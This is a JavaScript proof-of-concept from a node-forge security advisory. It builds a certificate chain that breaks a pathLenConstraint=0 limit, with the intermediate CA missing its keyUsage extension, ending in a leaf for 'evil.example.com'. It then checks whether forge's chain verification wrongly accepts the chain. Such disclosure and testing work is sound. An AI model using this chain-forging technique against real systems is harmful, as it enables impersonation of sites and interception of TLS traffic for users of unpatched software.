// Security Advisory PoC
//
// https://github.com/digitalbazaar/forge/security/advisories/GHSA-h46v-rmh6-fq4f
//
// offset (@offset)

const forge = require('../..');
const pki = forge.pki;

function generateKeyPair() {
  return pki.rsa.generateKeyPair({ bits: 2048, e: 0x10001 });
}

// 1. Root CA (self-signed)
const rootKeys = generateKeyPair();
const rootCert = pki.createCertificate();
rootCert.publicKey = rootKeys.publicKey;
rootCert.serialNumber = '01';
rootCert.validity.notBefore = new Date();
rootCert.validity.notAfter = new Date();
rootCert.validity.notAfter.setFullYear(rootCert.validity.notBefore.getFullYear() + 10);
const rootAttrs = [{ name: 'commonName', value: 'Root CA' }];
rootCert.setSubject(rootAttrs);
rootCert.setIssuer(rootAttrs);
rootCert.setExtensions([
  { name: 'basicConstraints', cA: true, critical: true },
  { name: 'keyUsage', keyCertSign: true, cRLSign: true, critical: true }
]);
rootCert.sign(rootKeys.privateKey, forge.md.sha256.create());

// 2. Intermediate CA: pathLenConstraint=0 but NO keyUsage extension
const intKeys = generateKeyPair();
const intCert = pki.createCertificate();
intCert.publicKey = intKeys.publicKey;
intCert.serialNumber = '02';
intCert.validity.notBefore = new Date();
intCert.validity.notAfter = new Date();
intCert.validity.notAfter.setFullYear(intCert.validity.notBefore.getFullYear() + 5);
const intAttrs = [{ name: 'commonName', value: 'Intermediate CA' }];
intCert.setSubject(intAttrs);
intCert.setIssuer(rootAttrs);
intCert.setExtensions([
  { name: 'basicConstraints', cA: true, pathLenConstraint: 0, critical: true }
  // NO keyUsage extension — this triggers the bypass
]);
intCert.sign(rootKeys.privateKey, forge.md.sha256.create());

// 3. Unauthorized sub-CA signed by intermediate (violates pathLen=0)
const subKeys = generateKeyPair();
const subCert = pki.createCertificate();
subCert.publicKey = subKeys.publicKey;
subCert.serialNumber = '03';
subCert.validity.notBefore = new Date();
subCert.validity.notAfter = new Date();
subCert.validity.notAfter.setFullYear(subCert.validity.notBefore.getFullYear() + 3);
const subAttrs = [{ name: 'commonName', value: 'Unauthorized Sub-CA' }];
subCert.setSubject(subAttrs);
subCert.setIssuer(intAttrs);
subCert.setExtensions([
  { name: 'basicConstraints', cA: true, critical: true },
  { name: 'keyUsage', keyCertSign: true, critical: true }
]);
subCert.sign(intKeys.privateKey, forge.md.sha256.create());

// 4. Leaf cert signed by unauthorized sub-CA
const leafKeys = generateKeyPair();
const leafCert = pki.createCertificate();
leafCert.publicKey = leafKeys.publicKey;
leafCert.serialNumber = '04';
leafCert.validity.notBefore = new Date();
leafCert.validity.notAfter = new Date();
leafCert.validity.notAfter.setFullYear(leafCert.validity.notBefore.getFullYear() + 1);
leafCert.setSubject([{ name: 'commonName', value: 'evil.example.com' }]);
leafCert.setIssuer(subAttrs);
leafCert.sign(subKeys.privateKey, forge.md.sha256.create());

// 5. Verify chain
const caStore = pki.createCaStore([rootCert]);
try {
  pki.verifyCertificateChain(caStore, [leafCert, subCert, intCert]);
  console.log('[VULNERABLE] Chain accepted — pathLenConstraint=0 NOT enforced');
} catch (e) {
  console.log('[SECURE] Chain rejected: ' + e.message);
}
